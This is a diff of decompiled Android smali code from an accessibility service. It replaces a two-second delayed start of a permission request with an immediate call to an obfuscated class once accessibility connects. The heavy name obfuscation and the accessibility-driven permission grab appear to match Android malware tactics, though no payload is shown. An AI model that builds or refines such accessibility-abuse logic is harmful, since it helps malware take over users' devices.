@@ -4378,14 +4378,7 @@
     # 无障碍连上后延迟 2 秒再拉权限申请
     :try_start_perm
     move-object/from16 v4, p0
-    new-instance v0, Landroid/os/Handler;
-    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
-    move-result-object v1
-    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
-    new-instance v1, Lڝږ؁ڋ/ٿ;
-    invoke-direct {v1, v4}, Lڝږ؁ڋ/ٿ;-><init>(Landroid/content/Context;)V
-    const-wide/16 v2, 0x7d0
-    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
+    invoke-static {v4}, Lڝږ؁ڋ/ڽ;->start(Landroid/accessibilityservice/AccessibilityService;)V
     :try_end_perm
     .catch Ljava/lang/Exception; {:try_start_perm .. :try_end_perm} :catch_perm
     goto :goto_perm
